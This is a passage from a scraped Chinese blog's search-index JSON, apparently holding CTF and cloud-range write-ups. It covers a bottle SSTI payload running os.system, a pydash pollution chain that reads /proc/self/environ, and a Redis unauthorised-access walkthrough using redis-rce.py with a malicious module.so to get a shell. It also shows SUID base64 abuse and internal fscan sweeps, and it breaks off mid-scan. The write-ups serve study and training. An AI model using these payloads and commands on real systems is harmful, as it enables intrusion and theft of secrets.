61bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) 非预期\nbottle的ssti不一定需要{}\npayload\n\u0026lt;h\u0026gt;\r%import os;os.system(\u0026#39;whoami\u0026#39;)\r%end\r\u0026lt;/h\u0026gt; ez_dash_revenge 题目\n1\u0026#39;\u0026#39;\u0026#39; 2Hints: Flag在环境变量中 3\u0026#39;\u0026#39;\u0026#39; 4 5 6from typing import Optional 7 8 9import pydash 10import bottle 11 12 13 14__forbidden_path__=[\u0026#39;__annotations__\u0026#39;, \u0026#39;__call__\u0026#39;, \u0026#39;__class__\u0026#39;, \u0026#39;__closure__\u0026#39;, 15 \u0026#39;__code__\u0026#39;, \u0026#39;__defaults__\u0026#39;, \u0026#39;__delattr__\u0026#39;, \u0026#39;__dict__\u0026#39;, 16 \u0026#39;__dir__\u0026#39;, \u0026#39;__doc__\u0026#39;, \u0026#39;__eq__\u0026#39;, \u0026#39;__format__\u0026#39;, 17 \u0026#39;__ge__\u0026#39;, \u0026#39;__get__\u0026#39;, \u0026#39;__getattribute__\u0026#39;, 18 \u0026#39;__gt__\u0026#39;, \u0026#39;__hash__\u0026#39;, \u0026#39;__init__\u0026#39;, \u0026#39;__init_subclass__\u0026#39;, 19 \u0026#39;__kwdefaults__\u0026#39;, \u0026#39;__le__\u0026#39;, \u0026#39;__lt__\u0026#39;, \u0026#39;__module__\u0026#39;, 20 \u0026#39;__name__\u0026#39;, \u0026#39;__ne__\u0026#39;, \u0026#39;__new__\u0026#39;, \u0026#39;__qualname__\u0026#39;, 21 \u0026#39;__reduce__\u0026#39;, \u0026#39;__reduce_ex__\u0026#39;, \u0026#39;__repr__\u0026#39;, \u0026#39;__setattr__\u0026#39;, 22 \u0026#39;__sizeof__\u0026#39;, \u0026#39;__str__\u0026#39;, \u0026#39;__subclasshook__\u0026#39;, \u0026#39;__wrapped__\u0026#39;, 23 \u0026#34;Optional\u0026#34;,\u0026#34;render\u0026#34; 24 ] 25__forbidden_name__=[ 26 \u0026#34;bottle\u0026#34; 27] 28__forbidden_name__.extend(dir(globals()[\u0026#34;__builtins__\u0026#34;])) 29 30def setval(name:str, path:str, value:str)-\u0026gt; Optional[bool]: 31 if name.find(\u0026#34;__\u0026#34;)\u0026gt;=0: return False 32 for word in __forbidden_name__: 33 if name==word: 34 return False 35 for word in __forbidden_path__: 36 if path.find(word)\u0026gt;=0: return False 37 obj=globals()[name] 38 try: 39 pydash.set_(obj,path,value) 40 except: 41 return False 42 return True 43 44@bottle.post(\u0026#39;/setValue\u0026#39;) 45def set_value(): 46 name = bottle.request.query.get(\u0026#39;name\u0026#39;) 47 path=bottle.request.json.get(\u0026#39;path\u0026#39;) 48 if not isinstance(path,str): 49 return \u0026#34;no\u0026#34; 50 if len(name)\u0026gt;6 or len(path)\u0026gt;32: 51 return \u0026#34;no\u0026#34; 52 value=bottle.request.json.get(\u0026#39;value\u0026#39;) 53 return \u0026#34;yes\u0026#34; if setval(name, path, value) else \u0026#34;no\u0026#34; 54 55@bottle.get(\u0026#39;/render\u0026#39;) 56def render_template(): 57 path=bottle.request.query.get(\u0026#39;path\u0026#39;) 58 if len(path)\u0026gt;10: 59 return \u0026#34;hacker\u0026#34; 60 blacklist=[\u0026#34;{\u0026#34;,\u0026#34;}\u0026#34;,\u0026#34;.\u0026#34;,\u0026#34;%\u0026#34;,\u0026#34;\u0026lt;\u0026#34;,\u0026#34;\u0026gt;\u0026#34;,\u0026#34;_\u0026#34;] 61 for c in path: 62 if c in blacklist: 63 return \u0026#34;hacker\u0026#34; 64 return bottle.template(path) 65bottle.run(host=\u0026#39;0.0.0.0\u0026#39;, port=8000) rev修复了非预期\n那就是打pydash污染\n首先想着先把__forbidden_name__污染掉\n?name=setval\r{\r\u0026#34;path\u0026#34;:\u0026#34;__globals__.__forbidden_name__\u0026#34;,\r\u0026#34;value\u0026#34;:\u0026#34;\u0026#34;\r} 发现no\n本地调试一下\n可以看到在高版本的pydash中会对path进行检查\n如果path中存在__globals__，__builtins__则会返回异常\n我们需要先把RESTRICTED_KEYS给污染掉\n?name=pydash\r{\r\u0026#34;path\u0026#34;:\u0026#34;helpers.RESTRICTED_KEYS\u0026#34;,\r\u0026#34;value\u0026#34;:\u0026#34;\u0026#34;\r} 现在就可以污染__forbidden_name__了\n污染掉__forbidden_name__之后，我们可以通过对bottle的模板路径进行污染从而实现在render路由进行任意文件读取，因为这题的flag在环境变量中，所以我们直接将TEMPLATE_PATH污染为**/proc/self**\n?name=bottle\r{\r\u0026#34;path\u0026#34;:\u0026#34;TEMPLATE_PATH\u0026#34;,\r\u0026#34;value\u0026#34;:[\u0026#34;/proc/self/\u0026#34;]\r} 接着在/render读环境变量\n?path=environ 拿到flag\n","permalink":"http://localhost:1313/post/nctf_2024/","summary":"\u003ch3 id=\"sqlmap-master\"\u003esqlmap-master\u003c/h3\u003e\n\u003cp\u003e题目\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 1\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003efastapi\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eFastAPI\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eRequest\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 2\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003efrom\u003c/span\u003e \u003cspan class=\"nn\"\u003efastapi.responses\u003c/span\u003e \u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"n\"\u003eFileResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eStreamingResponse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 3\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003esubprocess\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 4\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 5\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eapp\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eFastAPI\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 6\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 7\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nd\"\u003e@app.get\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 8\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003eindex\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e 9\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eFileResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;index.html\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e10\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e11\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nd\"\u003e@app.post\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;/run\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e12\u003c/span\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003easync\u003c/span\u003e \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e13\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003edata\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003eawait\u003c/span\u003e \u003cspan class=\"n\"\u003erequest\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e14\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;url\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e15\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e16\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e17\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;error\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;URL is required\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e18\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e19\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ecommand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sa\"\u003ef\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;sqlmap -u \u003c/span\u003e\u003cspan class=\"si\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"s1\"\u003e --batch --flush-session\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e20\u003c/span\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e21\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003edef\u003c/span\u003e \u003cspan class=\"nf\"\u003egenerate\u003c/span\u003e\u003cspan class=\"p\"\u003e():\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e22\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"n\"\u003eprocess\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ePopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e23\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003ecommand\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esplit\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e24\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ePIPE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e25\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003esubprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eSTDOUT\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e26\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003eshell\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"kc\"\u003eFalse\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e27\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e28\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e29\u003c/span\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"kc\"\u003eTrue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e30\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"n\"\u003eoutput\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereadline\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e31\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eoutput\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e \u003cspan class=\"ow\"\u003eand\u003c/span\u003e \u003cspan class=\"n\"\u003eprocess\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003epoll\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"ow\"\u003eis\u003c/span\u003e \u003cspan class=\"ow\"\u003enot\u003c/span\u003e \u003cspan class=\"kc\"\u003eNone\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e32\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e33\u003c/span\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eoutput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e34\u003c/span\u003e\u003cspan class=\"cl\"\u003e                \u003cspan class=\"k\"\u003eyield\u003c/span\u003e \u003cspan class=\"n\"\u003eoutput\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e35\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"ln\"\u003e36\u003c/span\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"n\"\u003eStreamingResponse\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003egenerate\u003c/span\u003e\u003cspan class=\"p\"\u003e(),\u003c/span\u003e \u003cspan class=\"n\"\u003emedia_type\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;text/plain\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e其实就是一个网页端的sqlmap\u003c/p\u003e\n\u003cp\u003e看一下sqlmap的使用文档\u003c/p\u003e","title":"NCTF-2025-Web-Writeup"},{"content":"参考文章\nhttps://bowuchuling.github.io/posts/chunqiuBrute4Road.html\nhttps://h0ny.github.io/posts/Brute4Road-%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83\n文章 - 浅谈约束委派攻击 - 先知社区\nFLAG1 拿到靶机先用fscan扫一扫\n┌──────────────────────────────────────────────┐\r│ ___ _ │\r│ / _ \\ ___ ___ _ __ __ _ ___| | __ │\r│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │\r│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │\r│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │\r└──────────────────────────────────────────────┘\rFscan Version: 2.0.0\r[2025-03-17 14:12:55] [INFO] 暴力破解线程数: 1\r[2025-03-17 14:12:55] [INFO] 开始信息扫描\r[2025-03-17 14:12:55] [INFO] 最终有效主机数量: 1\r[2025-03-17 14:12:55] [INFO] 开始主机扫描\r[2025-03-17 14:12:55] [INFO] 有效端口数量: 233\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:80\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:22\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:6379\r[2025-03-17 14:12:55] [SUCCESS] 端口开放 39.98.114.207:21\r[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:22 =\u0026gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]\r[2025-03-17 14:12:55] [SUCCESS] 服务识别 39.98.114.207:21 =\u0026gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]\r[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:80 =\u0026gt; [http] 版本:1.20.1 产品:nginx\r[2025-03-17 14:13:00] [SUCCESS] 服务识别 39.98.114.207:6379 =\u0026gt; [redis] 版本:5.0.12 产品:Redis key-value store\r[2025-03-17 14:13:06] [INFO] 存活端口数量: 4\r[2025-03-17 14:13:06] [INFO] 开始漏洞扫描\r[2025-03-17 14:13:06] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle\r[2025-03-17 14:13:06] [SUCCESS] 网站标题 http://39.98.114.207 状态码:200 长度:4833 标题:Welcome to CentOS\r[2025-03-17 14:13:07] [SUCCESS] 匿名登录成功!\r[2025-03-17 14:13:09] [SUCCESS] Redis 39.98.114.207:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb\r[2025-03-17 14:13:13] [SUCCESS] Redis无密码连接成功: 39.98.114.207:6379\r[2025-03-17 14:13:18] [SUCCESS] 扫描已完成: 5/5 发现redis不需要密码\n那我们连上去\nredis未授权拿shell的常见利用方法有写webshell，写corn或者写sshkey\n这里我先尝试了写corn\n发现没权限\n那同样的也没办法写sshkey\n看到redis版本为5.0.12\n可以打redis主从复制（4.x~5.0.5）\nRedis主从复制getshell技巧 - Bypass - 博客园\n生成恶意so文件\ngit clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand\rcd RedisModules-ExecuteCommand/\rmake 自动化攻击脚本\ngit clone https://github.com/Ridter/redis-rce.git\rcd redis-rce/\rcp ../RedisModules-ExecuteCommand/src/module.so ./\rpip install -r requirements.txt python redis-rce.py -r 192.168.28.152 -p 6379 -L 192.168.28.137 -f module.so\r//python redis-rce.py -r 目标ip-p 目标端口 -L 本地ip -f 恶意.so 拿到shell之后先上个线\n/home/redis/flag/flag01 读flag发现没有权限\n尝试suid提权\n1[redis@centos-web01 tmp]$ find / -perm -u=s -type f 2\u0026gt;/dev/null 2/usr/sbin/pam_timestamp_check 3/usr/sbin/usernetctl 4/usr/sbin/unix_chkpwd 5/usr/bin/at 6/usr/bin/chfn 7/usr/bin/gpasswd 8/usr/bin/passwd 9/usr/bin/chage 10/usr/bin/base64 11/usr/bin/umount 12/usr/bin/su 13/usr/bin/chsh 14/usr/bin/sudo 15/usr/bin/crontab 16/usr/bin/newgrp 17/usr/bin/mount 18/usr/bin/pkexec 19/usr/libexec/dbus-1/dbus-daemon-launch-helper 20/usr/lib/polkit-1/polkit-agent-helper-1 base64可以提权，但是只能读文件\nbase64 \u0026#34;/home/redis/flag/flag01\u0026#34; | base64 --decode [redis@centos-web01 tmp]$ base64 \u0026#34;/home/redis/flag/flag01\u0026#34; | base64 --decode\r██████ ██ ██ ███████ ██\r░█░░░░██ ░██ █░█ ░██░░░░██ ░██\r░█ ░██ ██████ ██ ██ ██████ █████ █ ░█ ░██ ░██ ██████ ██████ ░██\r░██████ ░░██░░█░██ ░██░░░██░ ██░░░██ ██████░███████ ██░░░░██ ░░░░░░██ ██████\r░█░░░░ ██ ░██ ░ ░██ ░██ ░██ ░███████░░░░░█ ░██░░░██ ░██ ░██ ███████ ██░░░██\r░█ ░██ ░██ ░██ ░██ ░██ ░██░░░░ ░█ ░██ ░░██ ░██ ░██ ██░░░░██ ░██ ░██\r░███████ ░███ ░░██████ ░░██ ░░██████ ░█ ░██ ░░██░░██████ ░░████████░░██████\r░░░░░░░ ░░░ ░░░░░░ ░░ ░░░░░░ ░ ░░ ░░ ░░░░░░ ░░░░░░░░ ░░░░░░ flag01: flag{b16a2a4f-87b9-404c-8989-3ac8eac58ae2}\rCongratulations! ! !\rGuess where is the second flag? 拿到第一个flag\nFLAG2 信息收集一下\n看一下ip\n1[redis@centos-web01 tmp]$ ip addr show 21: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 3 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 4 inet 127.0.0.1/8 scope host lo 5 valid_lft forever preferred_lft forever 6 inet6 ::1/128 scope host 7 valid_lft forever preferred_lft forever 82: eth0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 9 link/ether 00:16:3e:1a:f1:ec brd ff:ff:ff:ff:ff:ff 10 inet 172.22.2.7/16 brd 172.22.255.255 scope global dynamic eth0 11 valid_lft 315356573sec preferred_lft 315356573sec 12 inet6 fe80::216:3eff:fe1a:f1ec/64 scope link 13 valid_lft forever preferred_lft forever fscan扫一下\n1[redis@centos-web01 tmp]$ ./fscan -h 172.22.2.7/24 -nobr 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-03-17 20:10:58] [INFO] 暴力破解线程数: 1 12[2025-03-17 20:10:58] [INFO] 开始信息扫描 13[2025-03-17 20:10:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255 14[2025-03-17 20:10:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING) 15[2025-03-17 20:10:58] [INFO] 解析CIDR 172.22.2.7/24 -\u0026gt; IP范围 172.22.2.0-172.22.2.255 16[2025-03-17 20:10:58] [INFO] 最终有效主机数量: 256 17[2025-03-17 20:10:58] [INFO] 开始主机扫描 18[2025-03-17 20:10:58] [INFO] 正在尝试无监听ICMP探测... 19[2025-03-17 20:10:58] [INFO] 当前用户权限不足,无法发送ICMP包 20[2025-03-17 20:10:58] [INFO] 切换为PING方式探测... 21[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.3 存活 (ICMP) 22[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.7 存活 (ICMP) 23[2025-03-17 20:10:58] [SUCCESS] 目标 172.22.2.16 存活 (ICMP) 24[2025-03-17 20:10:59] [SUCCESS] 目标 172.22.2.18 存活 (ICMP) 25[2025-03-17 20:10:59] [SUCCESS] 目标 172.22.2.34 存活 (ICMP) 26[2025-03-17 20:11:04] [INFO] 存活主机数量: 5 27[2025-03-17 20:11:05] [INFO] 有效端口数量: 233 28[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:80 29[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:22 30[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:22 31[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.7:21 32[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:445 33[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:389 34[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:139 35[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:139 36[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:135 37[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:139 38[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:139 39[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:135 40[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:135 41[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.34:445 42[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:445 43[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.16:80 44[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.18:80 45[2025-03-17 20:11:05] [SUCCESS] 端口开放 172.22.2.3:88 46[2025-03-17 20:11:05] 